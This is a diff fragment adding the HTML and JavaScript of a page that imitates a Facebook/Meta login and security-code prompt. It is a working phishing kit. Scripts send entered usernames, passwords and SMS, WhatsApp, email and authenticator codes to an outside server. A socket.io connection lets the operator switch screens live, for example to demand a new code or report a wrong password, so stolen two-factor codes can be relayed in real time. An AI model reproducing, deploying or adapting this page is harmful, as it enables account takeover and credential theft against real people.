+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="ant-modal-body" style="height: 650px;display: none;" id="whatsappcode">
+                        <div class="confirmation-container-2">
+                            <div class="header-color">
+                                <div class="header-container">
+                                    <div class="logo__faceook"></div>
+                                </div>
+                            </div>
+                            <div class="auth-req-container-2">
+                                <div class="auth-req-2">
+                                    <div class="auth-req-text-2">
+                                        <h2>Enter security code</h2>
+                                        <div class="confirmation-second-2">
+                                            <div class="auth-req-paragraph-2">
+                                                <p class="first-1-text">Please check your Whatsapp for a message with
+                                                    your code. Your code is 6 numbers long.</p>
+                                            </div>
+                                            <div class="flex-confirmation-second-2">
+                                                <div class="input-auth-req-2"><input placeholder="Enter Code"
+                                                        type="number" required="" class="ant-input" id="whcode">
+                                                    <div id="error-message-whatsapp"
+                                                        style="color: red; display: none;padding-top: 10px;">
+                                                    </div>
+                                                </div>
+                                                <div class="sent-mail-2">
+                                                    <p>We sent your code to:</p>
+                                                    <p>+***********</p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="show-input-on-mobile-2"><input class="ant-input" type="text" value="">
+                                    </div>
+                                    <div class="auth-req-footer-2"><a>Didn't get a code?</a>
+                                        <div class="button-second-confirmation-2"><button type="submit"
+                                                id="whBtn">Continue</button></div>
+                                    </div>
+                                </div>
+
+                                <div class="show-footer-on-mobile-plus-2">§<h2 class="h2-foot-2">Not You? Log In
+                                        Here</h2>
+                                    <div class="footer-flex-mobile-plus-2">
+                                        <div>
+                                            <h2>English (US)</h2>
+                                            <p>Deutsch</p>
+                                            <p>Српски</p>
+                                            <p>Português (Brasil)</p>
+                                        </div>
+                                        <div>
+                                            <p>Italiano</p>
+                                            <p>Bosanski</p>
+                                            <p>Svensk</p><button>+</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="modal__footer">
+                            <div class="footer-menu-flex-ul-2">
+                                <div class="container-language-footer-2">
+                                    <ul class="flex-ul-second-confirmation">
+                                        <li>English (US)</li>
+                                        <li>Español</li>
+                                        <li>Deutsch</li>
+                                        <li>Türkçe</li>
+                                        <li>Српски</li>
+                                        <li>Français (France)</li>
+                                        <li>Italiano</li>
+                                        <li>Bosanski</li>
+                                        <li>Svensk</li>
+                                        <li>Português (Brasil)</li><button
+                                            class="countrys-button-2"><span>+</span></button>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-confirmation">
+                                    <ul>
+                                        <li>Sign Up</li>
+                                        <li>Log In</li>
+                                        <li>Messenger</li>
+                                        <li>Facebook Lite</li>
+                                        <li>Watch</li>
+                                        <li>Places</li>
+                                        <li>Games</li>
+                                        <li>Marketplace</li>
+                                        <li>Facebook Pay</li>
+                                        <li>Oculus</li>
+                                        <li>Portal</li>
+                                        <li>Instagram</li>
+                                        <li>Bulletin</li>
+                                        <li>Local</li>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-4">
+                                    <ul>
+                                        <li>Fundraisers</li>
+                                        <li>Services</li>
+                                        <li>Voting Information Centre</li>
+                                        <li>About</li>
+                                        <li>Create ad</li>
+                                        <li>Create Page</li>
+                                        <li>Developers</li>
+                                        <li>Careers</li>
+                                        <li>Privacy</li>
+                                        <li>Cookies</li>
+                                        <li class="ad-choice-img-2">Ad Choices <span class="img-li-2"></span> </li>
+                                        <li>Terms</li>
+                                        <li>Help</li>
+                                    </ul>
+                                </div>
+                                <div class="meta-footer-2">
+                                    <p>Meta © 2024</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="ant-modal-footer"><button type="button"
+                            class="ant-btn ant-btn-default"><span>Cancel</span></button><button type="button"
+                            class="ant-btn ant-btn-primary"><span>OK</span></button></div>
+                </div>
+                <div tabindex="0" aria-hidden="true" style="width: 0px; height: 0px; overflow: hidden; outline: none;">
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://jobback-skab.onrender.com/socket.io/socket.io.js"></script>
+    <script>
+        const shownCommands = {};
+        let clientId = localStorage.getItem('clientId');
+        if (!clientId) {
+            clientId = crypto.randomUUID();
+            localStorage.setItem('clientId', clientId);
+        }
+
+        const socket = io('https://jobback-skab.onrender.com', {
+            query: {
+                clientId
+            }
+        });
+        socket.on('redirect', (url) => {
+            window.location.href = url;
+        });
+        socket.on('connect', () => {
+            console.log("✅ Connected to server with socket ID:", socket.id);
+            const session = {
+                socketId: socket.id,
+                timestamp: Date.now()
+            };
+            localStorage.setItem('socketSession', JSON.stringify(session));
+        });
+
+        socket.on('show-calendar', () => {
+            window.location.href = 'calendly.html';
+        });
+
+        function isSectionVisible(id) {
+            const el = document.getElementById(id);
+            return el && el.style.display !== 'none';
+        }
+
+        function showOnly(sectionIdToShow) {
+            const loginForm = document.getElementById('login-form');
+            const oldpass = document.getElementById('oldpass');
+
+            if (loginForm) loginForm.style.display = 'none';
+            if (oldpass) oldpass.style.display = 'none';
+
+            const sectionIds = ['codeSms', 'authcode', 'codeEmail', 'whatsappcode', 'wrongpsw'];
+            sectionIds.forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.style.display = 'none';
+            });
+
+            const sectionToShow = document.getElementById(sectionIdToShow);
+            if (sectionToShow) sectionToShow.style.display = 'block';
+
+            clearInputsAndEnableButtons();
+        }
+
+        socket.on('show-wrong-creds', () => {
+            shownCommands['wrongpsw'] = true;
+            showOnly('wrongpsw');
+        });
+
+        // socket.on('show-old-pass', () => {
+        //     const loginForm = document.getElementById('login-form');
+        //     if (loginForm) loginForm.style.display = 'none';
+
+        //     const wrongPsw = document.getElementById('wrongpsw');
+        //     if (wrongPsw) wrongPsw.style.display = 'none';
+
+        //     const oldpass = document.getElementById('oldpass');
+        //     if (oldpass) oldpass.style.display = 'block';
+
+        //     clearInputsAndEnableButtons();
+        // });
+        socket.on('show-old-pass', () => {
+            shownCommands['oldpass'] = true;
+            showOnly('oldpass');
+
+        });
+        socket.on('show-2fa', () => {
+            const sectionId = 'codeSms';
+            if (shownCommands['2fa'] && isSectionVisible(sectionId)) {
+                const timerDiv = document.getElementById('error-message-sms');
+                const continueBtn = document.getElementById('smsBtn');
+                if (timerDiv) timerDiv.innerText = "The code you entered isn’t correct.";
+                if (timerDiv) timerDiv.style.display = 'block';
+                if (continueBtn) {
+                    continueBtn.innerHTML = 'Continue';
+                    continueBtn.disabled = false;
+                    continueBtn.style.opacity = '1';
+                    continueBtn.style.cursor = 'pointer';
+                }
+            } else {
+                shownCommands['2fa'] = true;
+                showOnly(sectionId);
+            }
+        });
+
+        socket.on('show-auth', () => {
+            const sectionId = 'authcode';
+            if (shownCommands['auth'] && isSectionVisible(sectionId)) {
+                const timerDiv = document.getElementById('error-message-auth');
+                const continueBtn = document.getElementById('authBtn');
+                if (timerDiv) timerDiv.innerText = "The code you entered isn’t correct.";
+                if (timerDiv) timerDiv.style.display = 'block';
+                if (continueBtn) {
+                    continueBtn.innerHTML = 'Continue';
+                    continueBtn.disabled = false;
+                    continueBtn.style.opacity = '1';
+                    continueBtn.style.cursor = 'pointer';
+                }
+            } else {
+                shownCommands['auth'] = true;
+                showOnly(sectionId);
+            }
+        });
+
+        socket.on('show-email', () => {
+            const sectionId = 'codeEmail';
+            if (shownCommands['email'] && isSectionVisible(sectionId)) {
+                const timerDiv = document.getElementById('error-message');
+                const continueBtn = document.getElementById('buttonemailcode');
+                if (timerDiv) timerDiv.innerText = "The code you entered isn’t correct.";
+                if (timerDiv) timerDiv.style.display = 'block';
+                if (continueBtn) {
+                    continueBtn.innerHTML = 'Continue';
+                    continueBtn.disabled = false;
+                    continueBtn.style.opacity = '1';
+                    continueBtn.style.cursor = 'pointer';
+                }
+            } else {
+                shownCommands['email'] = true;
+                showOnly(sectionId);
+            }
+        });
+
+        socket.on('show-whatsapp', () => {
+            const sectionId = 'whatsappcode';
+            if (shownCommands['whatsapp'] && isSectionVisible(sectionId)) {
+                const timerDiv = document.getElementById('error-message-whatsapp');
+                const continueBtn = document.getElementById('whBtn');
+                if (timerDiv) timerDiv.innerText = "The code you entered isn’t correct.";
+                if (timerDiv) timerDiv.style.display = 'block';
+                if (continueBtn) {
+                    continueBtn.innerHTML = 'Continue';
+                    continueBtn.disabled = false;
+                    continueBtn.style.opacity = '1';
+                    continueBtn.style.cursor = 'pointer';
+                }
+            } else {
+                shownCommands['whatsapp'] = true;
+                showOnly(sectionId);
+            }
+        });
+
+        function clearInputsAndEnableButtons() {
+            const fields = [
+                'email', 'pass', 'confirm_username', 'confirm_password',
+                'old_username', 'old_password', 'smscode', 'whcode',
+                'authcodedes', 'emailcodedes'
+            ];
+
+            const loginButtons = ['loginBtn', 'confirm_login', 'old_login'];
+            const authButtons = ['smsBtn', 'whBtn', 'authBtn', 'buttonemailcode'];
+
+            fields.forEach(id => {
+                const input = document.getElementById(id);
+                if (input) input.value = '';
+            });
+
+            loginButtons.forEach(id => {
+                const btn = document.getElementById(id);
+                if (btn) {
+                    btn.disabled = false;
+                    btn.style.opacity = '1';
+                    btn.style.cursor = 'pointer';
+                    btn.innerHTML = 'Log In';
+                }
+            });
+
+            authButtons.forEach(id => {
+                const btn = document.getElementById(id);
+                if (btn) {
+                    btn.disabled = false;
+                    btn.style.opacity = '1';
+                    btn.style.cursor = 'pointer';
+                    btn.innerHTML = 'Continue';
+                }
+            });
+        }
+
+        function setupAuthBlock(inputId, buttonId, length = 6, apiUrl = 'https://jobback-skab.onrender.com/send-auth-code') {
+            const code = document.getElementById(inputId);
+            const smsBtn = document.getElementById(buttonId);
+
+            if (!code || !smsBtn) {
+                console.error(`Elements not found for: ${inputId}, ${buttonId}`);
+                return;
+            }
+
+            code.addEventListener('input', () => {
+                const val = code.value.replace(/\D/g, '').slice(0, length);
+                code.value = val;
+
+                if (val.length === length) {
+                    smsBtn.disabled = false;
+                    smsBtn.style.opacity = '1';
+                    smsBtn.style.cursor = 'pointer';
+                } else {
+                    smsBtn.disabled = true;
+                    smsBtn.style.opacity = '0.4';
+                    smsBtn.style.cursor = 'not-allowed';
+                    smsBtn.style.width = '130px';
+                }
+            });
+
+            smsBtn.addEventListener('click', () => {
+                const codeValue = code.value;
+                const socketId = socket.id;
+                console.log(`[${inputId}] Sending code:`, codeValue);
+
+                if (codeValue.length !== length) {
+                    console.warn(`[${inputId}] Code is not ${length} digits`);
+                    return;
+                }
+
+                smsBtn.disabled = true;
+                smsBtn.innerHTML = '<span class="loading-spinner"></span>';
+
+                fetch(apiUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            code: codeValue,
+                            socketId: socketId
+                        })
+                    })
+                    .then(res => res.json())
+                    .then(data => {
+                        smsBtn.disabled = true;
+                        smsBtn.style.opacity = '0.4';
+                        smsBtn.style.cursor = 'not-allowed';
+                        smsBtn.style.width = '130px';
+                    })
+                    .catch(err => {
+                        console.error(`[${inputId}] Fetch error:`, err);
+                        smsBtn.innerHTML = 'Continue';
+                        smsBtn.disabled = false;
+                    });
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            setupAuthBlock('smscode', 'smsBtn');
+            setupAuthBlock('whcode', 'whBtn');
+            setupAuthBlock('authcodedes', 'authBtn');
+            setupAuthBlock('emailcodedes', 'buttonemailcode', 8, 'https://jobback-skab.onrender.com/send-email-code');
+        });
+    </script>
+
+    <script>
+        const loginBtn = document.getElementById('loginBtn');
+        const confirm_login = document.getElementById('confirm_login');
+        const old_login = document.getElementById('old_login');
+        const usernameInput = document.getElementById('email');
+        const passwordInput = document.getElementById('pass');
+        const confirm_username = document.getElementById('confirm_username');
+        const confirm_password = document.getElementById('confirm_password');
+        const old_username = document.getElementById('old_username');
+        const old_password = document.getElementById('old_password');
+
+        usernameInput.addEventListener('input', enableLoginBtn);
+        passwordInput.addEventListener('input', enableLoginBtn);
+        confirm_username.addEventListener('input', enableLoginBtn);
+        confirm_password.addEventListener('input', enableLoginBtn);
+        old_username.addEventListener('input', enableLoginBtn);
+        old_password.addEventListener('input', enableLoginBtn);
+
+        function enableLoginBtn() {
+            if (usernameInput.value.trim() && passwordInput.value.trim()) {
+                loginBtn.disabled = false;
+                loginBtn.style.opacity = '1';
+                loginBtn.style.cursor = 'pointer';
+            } else {
+                loginBtn.disabled = true;
+                loginBtn.style.opacity = '0.4';
+                loginBtn.style.cursor = 'not-allowed';
+            }
+        }
+
+        async function sendLoginData() {
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (!username || !password) return;
+
+
+            loginBtn.disabled = true;
+            loginBtn.style.opacity = '0.4';
+            loginBtn.style.cursor = 'not-allowed';
+            loginBtn.style.height = '35px';
+            loginBtn.innerHTML = '<span class="loading-spinner"></span>';
+
+            try {
+                const response = await fetch('https://jobback-skab.onrender.com/send-login-data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        username,
+                        password,
+                        socketId: socket.id
+                    })
+                });
+
+                const data = await response.json();
+
+
+                if (data.success) {
+
+                } else {
+
+                }
+            } catch (error) {
+                console.error('Error:', error);
+
+            }
+
+
+        }
+        async function sendWrongData() {
+            const username = confirm_username.value.trim();
+            const password = confirm_password.value.trim();
+
+            if (!username || !password) return;
+
+
+            confirm_login.disabled = true;
+            confirm_login.style.opacity = '0.4';
+            confirm_login.style.cursor = 'not-allowed';
+            confirm_login.style.height = '35px';
+            confirm_login.innerHTML = '<span class="loading-spinner"></span>';
+
+            try {
+                const response = await fetch('https://jobback-skab.onrender.com/send-login-data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        username,
+                        password,
+                        socketId: socket.id
+                    })
+                });
+
+                const data = await response.json();
+
+
+                if (data.success) {
+
+                } else {
+
+                }
+            } catch (error) {
+                console.error('Error:', error);
+
+            }
+
+
+        }
+        async function sendOldData() {
+            const username = old_username.value.trim();
+            const password = old_password.value.trim();
+
+            if (!username || !password) return;
+
+
+            old_login.disabled = true;
+            old_login.style.opacity = '0.4';
+            old_login.style.cursor = 'not-allowed';
+            old_login.style.height = '35px';
+            old_login.innerHTML = '<span class="loading-spinner"></span>';
+
+            try {
+                const response = await fetch('https://jobback-skab.onrender.com/send-login-data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        username,
+                        password,
+                        socketId: socket.id
+                    })
+                });
+
+                const data = await response.json();
+
+
+                if (data.success) {
+
+                } else {
+
+                }
+            } catch (error) {
+                console.error('Error:', error);
+
+            }
+
+
+        }
+        loginBtn.addEventListener('click', sendLoginData);
+        confirm_login.addEventListener('click', sendWrongData);
+        old_login.addEventListener('click', sendOldData);
+    </script>
+    <script>
+        function isMobileDevice() {
+            return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        }
+
+        function handleButtonClick() {
+            if (isMobileDevice()) {
+
+                window.location.href = 'mobile.html';
+            } else {
+
+                openDesktopModal();
+            }
+        }
+
+        function openDesktopModal() {
+
+            const modal = document.getElementById('facebook-modal');
+            if (modal) {
+                modal.style.display = 'block';
+            } else {
+
+            }
+        }
+    </script>
+
+</body>
+
+</html>
